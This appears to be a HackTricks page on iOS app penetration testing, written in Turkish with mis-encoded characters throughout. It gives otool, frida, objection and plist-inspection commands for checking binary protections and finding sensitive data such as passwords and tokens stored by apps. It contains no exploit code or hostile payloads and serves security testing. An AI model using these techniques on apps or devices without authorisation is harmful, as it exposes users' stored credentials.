# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **otomatik iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶nderin.

</details>

## iOS Temelleri

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Test OrtamÄ±

Bu sayfada **iOS simÃ¼latÃ¶rÃ¼**, **emÃ¼latÃ¶rler** ve **jailbreak** hakkÄ±nda bilgi bulabilirsiniz:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Ä°lk Analiz

### Temel iOS Test Ä°ÅŸlemleri

Test sÄ±rasÄ±nda **Ã§eÅŸitli iÅŸlemler Ã¶nerilecek** (cihaza baÄŸlanma, dosya okuma/yazma/yÃ¼kleme/indirme, bazÄ± araÃ§larÄ± kullanma...). Bu nedenle, bu iÅŸlemlerin nasÄ±l gerÃ§ekleÅŸtirileceÄŸini bilmiyorsanÄ±z, lÃ¼tfen **sayfayÄ± okumaya baÅŸlayÄ±n**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
AÅŸaÄŸÄ±daki adÄ±mlar iÃ§in **uygulamanÄ±n cihaza yÃ¼klenmiÅŸ olmasÄ±** ve uygulamanÄ±n **IPA dosyasÄ±nÄ±n zaten edinilmiÅŸ olmasÄ±** gerekmektedir.\
Bunu nasÄ±l yapacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenmek iÃ§in [Temel iOS Test Ä°ÅŸlemleri](basic-ios-testing-operations.md) sayfasÄ±nÄ± okuyun.
{% endhint %}

### Temel Statik Analiz

**MobSF** aracÄ±nÄ± kullanarak IPA dosyasÄ±na otomatik Statik Analiz yapmanÄ±z Ã¶nerilir.

**Binary'de bulunan korumalarÄ±n tanÄ±mlanmasÄ±**:

*   **PIE (Konum BaÄŸÄ±msÄ±z YÃ¼rÃ¼tÃ¼lebilir)**: EtkinleÅŸtirildiÄŸinde, uygulama her baÅŸlatÄ±ldÄ±ÄŸÄ±nda rastgele bir bellek adresine yÃ¼klenir, baÅŸlangÄ±Ã§ bellek adresini tahmin etmeyi zorlaÅŸtÄ±rÄ±r.

```bash
otool -hv <app-binary> | grep PIE   # PIE bayraÄŸÄ±nÄ± iÃ§ermesi gerekmektedir
```
*   **YÄ±ÄŸÄ±n KanaryalarÄ±**: YÄ±ÄŸÄ±nÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulamak iÃ§in bir 'kanarya' deÄŸeri bir iÅŸlevi Ã§aÄŸÄ±rmadan Ã¶nce yÄ±ÄŸÄ±na yerleÅŸtirilir ve iÅŸlev sona erdiÄŸinde yeniden doÄŸrulanÄ±r.

```bash
otool -I -v <app-binary> | grep stack_chk   # stack_chk_guard ve stack_chk_fail sembollerini iÃ§ermesi gerekmektedir
```
*   **ARC (Otomatik Referans SayÄ±mÄ±)**: Ortak bellek bozulma hatalarÄ±nÄ± Ã¶nlemek iÃ§in

```bash
otool -I -v <app-binary> | grep objc_release   # _objc_release sembolÃ¼nÃ¼ iÃ§ermesi gerekmektedir
```
*   **ÅifrelenmiÅŸ Binary**: Binary ÅŸifrelenmiÅŸ olmalÄ±dÄ±r

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid 1 olmalÄ±dÄ±r
```

**Hassas/GÃ¼vensiz FonksiyonlarÄ±n TanÄ±mlanmasÄ±**

*   **ZayÄ±f Hashleme AlgoritmalarÄ±**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Linux Ã¼zerinde
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **GÃ¼vensiz Rastgele Fonksiyonlar**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Linux Ã¼zerinde
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **GÃ¼vensiz 'Malloc' Fonksiyonu**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_malloc"

# Linux Ã¼zerinde
grep -iER "_malloc"
```
*   **GÃ¼vensiz ve KÃ¶tÃ¼ye KullanÄ±labilir Fonksiyonlar**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Linux Ã¼zerinde
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Temel Dinamik Analiz

[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) tarafÄ±ndan gerÃ§ekleÅŸtirilen dinamik analize gÃ¶z atÄ±n. FarklÄ± gÃ¶rÃ¼nÃ¼mler arasÄ±nda gezinmeniz ve etkileÅŸimde bulunmanÄ±z gerekecek, ancak birÃ§ok sÄ±nÄ±fa baÄŸlanacak ve diÄŸer iÅŸlemleri yapacak ve iÅŸiniz bittiÄŸinde bir rapor hazÄ±rlayacaktÄ±r.

### YÃ¼klÃ¼ UygulamalarÄ±n Listelenmesi

`frida-ps -Uai` komutunu kullanarak yÃ¼klÃ¼ uygulamalarÄ±n **paket tanÄ±mlayÄ±cÄ±sÄ±nÄ±** belirleyin:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Temel NumaralandÄ±rma ve Hooking

UygulamanÄ±n bileÅŸenlerini **numaralandÄ±rma** ve yÃ¶ntemleri ve sÄ±nÄ±flarÄ± kolayca **hooklama** konusunda objection ile nasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenin:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA YapÄ±sÄ±

Bir **IPA dosyasÄ±nÄ±n** yapÄ±sÄ± temelde bir **sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ paket** yapÄ±sÄ±ndadÄ±r. UzantÄ±sÄ±nÄ± `.zip` olarak deÄŸiÅŸtirerek, iÃ§eriÄŸini ortaya Ã§Ä±karmak iÃ§in **aÃ§Ä±labilir**. Bu yapÄ± iÃ§inde, bir **Paket** uygulamanÄ±n kurulmaya hazÄ±r tamamen paketlenmiÅŸ bir uygulamayÄ± temsil eder. Ä°Ã§inde, uygulamanÄ±n kaynaklarÄ±nÄ± kapsayan `<NAME>.app` adÄ±nda bir dizin bulacaksÄ±nÄ±z.

* **`Info.plist`**: Bu dosya uygulamanÄ±n belirli yapÄ±landÄ±rma detaylarÄ±nÄ± tutar.
* **`_CodeSignature/`**: Bu dizin, paketteki tÃ¼m dosyalarÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ saÄŸlayan bir imza iÃ§eren bir plist dosyasÄ±nÄ± iÃ§erir.
* **`Assets.car`**: Simgeler gibi varlÄ±k dosyalarÄ±nÄ± depolayan sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ bir arÅŸiv.
* **`Frameworks/`**: Bu klasÃ¶r uygulamanÄ±n yerel kÃ¼tÃ¼phanelerini barÄ±ndÄ±rÄ±r, bu kÃ¼tÃ¼phaneler `.dylib` veya `.framework` dosyalarÄ± ÅŸeklinde olabilir.
* **`PlugIns/`**: Bu, uygulamanÄ±n uzantÄ±larÄ±nÄ± iÃ§erebilir, `.appex` dosyalarÄ± olarak bilinir, ancak her zaman mevcut deÄŸildir.
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): UygulamanÄ±zÄ±n kalÄ±cÄ± verilerini Ã§evrimdÄ±ÅŸÄ± kullanÄ±m iÃ§in kaydetmek, geÃ§ici verileri Ã¶nbelleÄŸe almak ve uygulamanÄ±za tek bir cihazda geri alma iÅŸlevselliÄŸi eklemek iÃ§in kullanÄ±lÄ±r. Bir iCloud hesabÄ±nda birden fazla cihaz arasÄ±nda veri senkronizasyonu yapmak iÃ§in Core Data, ÅŸemanÄ±zÄ± otomatik olarak bir CloudKit konteynerine yansÄ±tÄ±r.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo` dosyasÄ±, uygulamanÄ±zÄ±n veya paketinizin tÃ¼rÃ¼nÃ¼ ve yaratÄ±cÄ± kodlarÄ±nÄ± belirtmenin alternatif bir yoludur.
* **en.lproj, fr.proj, Base.lproj**: Bu, belirli diller iÃ§in kaynaklarÄ± iÃ§eren dil paketleridir ve bir dil desteklenmiyorsa varsayÄ±lan bir kaynak iÃ§erir.
* **GÃ¼venlik**: `_CodeSignature/` dizini, dijital imzalar aracÄ±lÄ±ÄŸÄ±yla tÃ¼m paketlenmiÅŸ dosyalarÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulayarak uygulamanÄ±n gÃ¼venliÄŸinde kritik bir rol oynar.
* **VarlÄ±k YÃ¶netimi**: `Assets.car` dosyasÄ±, grafiksel varlÄ±klarÄ± verimli bir ÅŸekilde yÃ¶netmek iÃ§in sÄ±kÄ±ÅŸtÄ±rma kullanÄ±r, bu da uygulama performansÄ±nÄ± optimize etmek ve genel boyutunu azaltmak iÃ§in Ã¶nemlidir.
* **KÃ¼tÃ¼phaneler ve Eklentiler**: Bu dizinler, iOS uygulamalarÄ±nÄ±n modÃ¼lerliÄŸini vurgular, geliÅŸtiricilere tekrar kullanÄ±labilir kod kÃ¼tÃ¼phanelerini (`Frameworks/`) iÃ§ermelerine ve uygulama iÅŸlevselliÄŸini geniÅŸletmelerine (`PlugIns/`) olanak tanÄ±r.
* **YerelleÅŸtirme**: YapÄ±, Ã¶zel dil paketleri iÃ§in kaynaklarÄ± iÃ§ererek Ã§oklu dilleri destekler, bÃ¶ylece belirli dil paketleri iÃ§in kaynaklarÄ± iÃ§ererek kÃ¼resel uygulama eriÅŸimini kolaylaÅŸtÄ±rÄ±r.

**Info.plist**

**Info.plist**, iOS uygulamalarÄ± iÃ§in bir kÃ¶ÅŸetaÅŸÄ± olarak hizmet eder, ana yapÄ±landÄ±rma verilerini **anahtar-deÄŸer** Ã§iftleri ÅŸeklinde kapsar. Bu dosya sadece uygulamalar iÃ§in deÄŸil, aynÄ± zamanda uygulama uzantÄ±larÄ± ve iÃ§inde paketlenmiÅŸ Ã§erÃ§eveler iÃ§in de gereklidir. XML veya ikili bir formatta yapÄ±landÄ±rÄ±lmÄ±ÅŸ olup, uygulama izinlerinden gÃ¼venlik yapÄ±landÄ±rmalarÄ±na kadar kritik bilgileri iÃ§erir. Mevcut anahtarlar hakkÄ±nda detaylÄ± keÅŸif iÃ§in [**Apple GeliÅŸtirici Belgelerine**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc) baÅŸvurulabilir.

Bu dosya ile Ã§alÄ±ÅŸmak isteyenler iÃ§in daha eriÅŸilebilir bir formatta Ã§alÄ±ÅŸmak iÃ§in XML dÃ¶nÃ¼ÅŸÃ¼mÃ¼, macOS'ta (`plutil` ile, 10.2 ve sonraki sÃ¼rÃ¼mlerde doÄŸal olarak mevcuttur) veya Linux'ta (`plistutil` ile) kolayca gerÃ§ekleÅŸtirilebilir. DÃ¶nÃ¼ÅŸÃ¼m iÃ§in komutlar ÅŸunlardÄ±r:

* **macOS iÃ§in**:
```bash
$ plutil -convert xml1 Info.plist
```
* **Linux iÃ§in**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Info.plist** dosyasÄ±nÄ±n ifÅŸa edebileceÄŸi bilgi yÄ±ÄŸÄ±nÄ± arasÄ±nda, dikkate deÄŸer giriÅŸler arasÄ±nda uygulama izni dizeleri (`UsageDescription`), Ã¶zel URL ÅŸemalarÄ± (`CFBundleURLTypes`) ve App Transport Security iÃ§in yapÄ±landÄ±rmalar (`NSAppTransportSecurity`) bulunmaktadÄ±r. Bu giriÅŸler, `grep` komutunu kullanarak dosyayÄ± inceleyerek veya basit bir ÅŸekilde yerini tespit edebilir.
```bash
$ grep -i <keyword> Info.plist
```
**Veri YollarÄ±**

iOS ortamÄ±nda, dizinler Ã¶zellikle **sistem uygulamalarÄ±** ve **kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamalar** iÃ§in ayrÄ±lmÄ±ÅŸtÄ±r. Sistem uygulamalarÄ± `/Applications` dizininde bulunurken, kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamalar `/private/var/containers/` altÄ±na yerleÅŸtirilir. Bu uygulamalara **128-bit UUID** olarak bilinen benzersiz bir kimlik atamasÄ± yapÄ±lÄ±r, bu nedenle uygulamanÄ±n klasÃ¶rÃ¼nÃ¼ manuel olarak bulmak rastgele dizin adlarÄ±ndan dolayÄ± zor olabilir.

KullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen bir uygulamanÄ±n kurulum dizinini keÅŸfetmeyi kolaylaÅŸtÄ±rmak iÃ§in **objection aracÄ±** yararlÄ± bir `env` komutu saÄŸlar. Bu komut, sÃ¶z konusu uygulama iÃ§in detaylÄ± dizin bilgilerini ortaya Ã§Ä±karÄ±r. AÅŸaÄŸÄ±da bu komutun nasÄ±l kullanÄ±lacaÄŸÄ±na dair bir Ã¶rnek bulunmaktadÄ±r:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternatif olarak, uygulama adÄ± `find` komutu kullanÄ±larak `/private/var/containers` iÃ§inde aranabilir:
```bash
find /private/var/containers -name "Progname*"
```
Komutlar `ps` ve `lsof` ayrÄ±ca uygulamanÄ±n iÅŸlemini tanÄ±mlamak ve sÄ±rasÄ±yla aÃ§Ä±k dosyalarÄ± listelemek iÃ§in kullanÄ±labilir, uygulamanÄ±n etkin dizin yollarÄ±na dair iÃ§gÃ¶rÃ¼ler saÄŸlar:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Paket dizini:**

* **AppName.app**
* Bu, IPA'da daha Ã¶nce gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi Uygulama Paketi olup, temel uygulama verilerini, statik iÃ§eriÄŸi ve uygulamanÄ±n derlenmiÅŸ ikilisini iÃ§erir.
* Bu dizin kullanÄ±cÄ±lara gÃ¶rÃ¼nÃ¼r, ancak **kullanÄ±cÄ±lar yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* Bu klasÃ¶rÃ¼n iÃ§eriÄŸi kod imzasÄ±nÄ± **doÄŸrulamak** iÃ§in kullanÄ±lÄ±r.

**Veri dizini:**

* **Documents/**
* TÃ¼m kullanÄ±cÄ± tarafÄ±ndan oluÅŸturulan verileri iÃ§erir. Uygulama son kullanÄ±cÄ± bu verilerin oluÅŸturulmasÄ±nÄ± baÅŸlatÄ±r.
* KullanÄ±cÄ±lara gÃ¶rÃ¼nÃ¼r ve **kullanÄ±cÄ±lar yazabilir**.
* Bu dizindeki iÃ§erik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yollarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir.
* **Library/**
* **KullanÄ±cÄ±ya Ã¶zgÃ¼ olmayan dosyalarÄ±** iÃ§erir, **Ã¶n bellekler**, **tercihler**, **Ã§erezler** ve Ã¶zellik listesi (plist) yapÄ±landÄ±rma dosyalarÄ± gibi.
* iOS uygulamalarÄ± genellikle `Application Support` ve `Caches` alt dizinlerini kullanÄ±r, ancak uygulama Ã¶zel alt dizinler oluÅŸturabilir.
* **Library/Caches/**
* **YarÄ± kalÄ±cÄ± Ã¶nbellek dosyalarÄ±nÄ±** iÃ§erir.
* KullanÄ±cÄ±lara **gÃ¶rÃ¼nmez ve kullanÄ±cÄ±lar yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* Uygulama Ã§alÄ±ÅŸmÄ±yorken ve depolama alanÄ± azaldÄ±ÄŸÄ±nda iÅŸletim sistemi bu dizinin dosyalarÄ±nÄ± otomatik olarak silebilir.
* **Library/Application Support/**
* UygulamanÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in gerekli olan **kalÄ±cÄ± dosyalarÄ±** iÃ§erir.
* KullanÄ±cÄ±lara **gÃ¶rÃ¼nmez ve kullanÄ±cÄ±lar yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yollarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir.
* **Library/Preferences/**
* Bir uygulama yeniden baÅŸlatÄ±ldÄ±ktan sonra bile **kalÄ±cÄ± olabilen Ã¶zellikleri** depolamak iÃ§in kullanÄ±lÄ±r.
* Bilgiler, \[BUNDLE\_ID].plist adlÄ± bir plist dosyasÄ±nda ÅŸifrelenmemiÅŸ olarak uygulama kum havuzunun iÃ§inde kaydedilir.
* `NSUserDefaults` kullanÄ±larak depolanan tÃ¼m anahtar/deÄŸer Ã§iftleri bu dosyada bulunabilir.
* **tmp/**
* Uygulama baÅŸlatmalarÄ± arasÄ±nda kalÄ±cÄ± olmasÄ± gerekli olmayan **geÃ§ici dosyalarÄ±** yazmak iÃ§in bu dizini kullanÄ±n.
* KalÄ±cÄ± olmayan Ã¶nbellek dosyalarÄ±nÄ± iÃ§erir.
* KullanÄ±cÄ±lara **gÃ¶rÃ¼nmez**.
* Bu dizindeki iÃ§erik yedeklenmez.
* Uygulama Ã§alÄ±ÅŸmÄ±yorken ve depolama alanÄ± azaldÄ±ÄŸÄ±nda iÅŸletim sistemi bu dizinin dosyalarÄ±nÄ± otomatik olarak silebilir.

iGoat-Swift'in Uygulama Paketi (.app) dizinine (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`) daha yakÄ±ndan bakalÄ±m:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Tersine MÃ¼hendislik

`<application-name>.app` klasÃ¶rÃ¼ iÃ§inde `<application-name>` adÄ±nda bir ikili dosya bulacaksÄ±nÄ±z. Bu dosya **Ã§alÄ±ÅŸtÄ±rÄ±lacak** dosyadÄ±r. Ä°kili dosyayÄ± temel bir inceleme yapmak iÃ§in **`otool`** aracÄ±nÄ± kullanabilirsiniz:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**UygulamanÄ±n ÅŸifrelenip ÅŸifrelenmediÄŸini kontrol edin**

AÅŸaÄŸÄ±daki komutu kullanarak Ã§Ä±ktÄ± olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Binary dosyasÄ±nÄ±n ayrÄ±ÅŸtÄ±rÄ±lmasÄ±**

Metin bÃ¶lÃ¼mÃ¼nÃ¼ ayrÄ±ÅŸtÄ±rÄ±n:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
**Ã–rnek uygulamanÄ±n Objective-C segmentini** yazdÄ±rmak iÃ§in ÅŸunu kullanabilirsiniz:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Kodun daha kompakt hale gelmesi iÃ§in [**class-dump**](http://stevenygard.com/projects/class-dump/) kullanabilirsiniz:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ancak, binary dosyasÄ±nÄ± Ã§Ã¶zmek iÃ§in en iyi seÃ§enekler: [**Hopper**](https://www.hopperapp.com/download.html?) ve [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **otomatik iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Veri Depolama

iOS'un cihazda veri depolama hakkÄ±nda bilgi edinmek iÃ§in bu sayfayÄ± okuyun:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Uygulama **kurulduktan hemen sonra**, uygulamanÄ±n tÃ¼m iÅŸlevleri kontrol edildikten sonra ve hatta **bir kullanÄ±cÄ±dan Ã§Ä±kÄ±p farklÄ± bir kullanÄ±cÄ±ya giriÅŸ yapÄ±ldÄ±ktan sonra** bilgi depolama yerleri kontrol edilmelidir.\
AmaÃ§, uygulamanÄ±n (ÅŸifreler, tokenlar), mevcut kullanÄ±cÄ±nÄ±n ve Ã¶nceki oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ±n **korumasÄ±z hassas bilgilerini** bulmaktÄ±r.
{% endhint %}

### Plist

**plist** dosyalarÄ±, **anahtar-deÄŸer Ã§iftlerini iÃ§eren yapÄ±landÄ±rÄ±lmÄ±ÅŸ XML dosyalarÄ±dÄ±r**. KalÄ±cÄ± verileri depolamanÄ±n bir yoludur, bu nedenle bazen bu dosyalarda **hassas bilgiler bulabilirsiniz**. Bu dosyalarÄ±n, uygulamayÄ± yÃ¼kledikten ve yoÄŸun bir ÅŸekilde kullandÄ±ktan sonra kontrol edilmesi Ã¶nerilir.

Plist dosyalarÄ±nda veri saklamanÄ±n en yaygÄ±n yolu, **NSUserDefaults**'un kullanÄ±lmasÄ±dÄ±r. Bu plist dosyasÄ±, **`Library/Preferences/<appBundleID>.plist`** iÃ§inde uygulama sandbox'Ä±nda kaydedilir.

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) sÄ±nÄ±fÄ±, varsayÄ±lan sistemle etkileÅŸim iÃ§in programatik bir arayÃ¼z saÄŸlar. VarsayÄ±lan sistem, bir uygulamanÄ±n davranÄ±ÅŸÄ±nÄ± **kullanÄ±cÄ± tercihlerine** gÃ¶re Ã¶zelleÅŸtirmesine izin verir. `NSUserDefaults` tarafÄ±ndan kaydedilen veriler, uygulama paketinde gÃ¶rÃ¼ntÃ¼lenebilir. Bu sÄ±nÄ±f, **veriyi** bir **plist** **dosyasÄ±nda** saklar, ancak kÃ¼Ã§Ã¼k miktarlarda veriyle kullanÄ±lmasÄ± amaÃ§lanmÄ±ÅŸtÄ±r.

Bu verilere doÄŸrudan gÃ¼venilir bir bilgisayardan eriÅŸilemez, ancak bir **yedekleme** yaparak eriÅŸilebilir.

`NSUserDefaults` kullanÄ±larak kaydedilen bilgileri **`NSUserDefaults`** kullanarak Ã§Ã¶zebilirsiniz.

Uygulama tarafÄ±ndan kullanÄ±lan tÃ¼m plist dosyalarÄ±nÄ± bulmak iÃ§in `/private/var/mobile/Containers/Data/Application/{APPID}` dizinine eriÅŸebilir ve ÅŸunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
find ./ -name "*.plist"
```
**XML veya ikili (bplist) formatÄ±ndaki dosyalarÄ± XML'e dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in, iÅŸletim sisteminize baÄŸlÄ± olarak Ã§eÅŸitli yÃ¶ntemler mevcuttur:**

**MacOS KullanÄ±cÄ±larÄ± iÃ§in:** `plutil` komutunu kullanÄ±n. Bu amaÃ§la tasarlanmÄ±ÅŸ olan macOS'ta (10.2+), yerleÅŸik bir araÃ§tÄ±r.
```bash
$ plutil -convert xml1 Info.plist
```
**Linux KullanÄ±cÄ±larÄ± iÃ§in:** Ä°lk olarak `libplist-utils`'Ä± yÃ¼kleyin, ardÄ±ndan dosyanÄ±zÄ± dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in `plistutil`'Ä± kullanÄ±n:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Objection Oturumu Ä°Ã§inde:** Mobil uygulamalarÄ± analiz etmek iÃ§in belirli bir komut, plist dosyalarÄ±nÄ± doÄŸrudan dÃ¶nÃ¼ÅŸtÃ¼rmenize olanak tanÄ±r:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

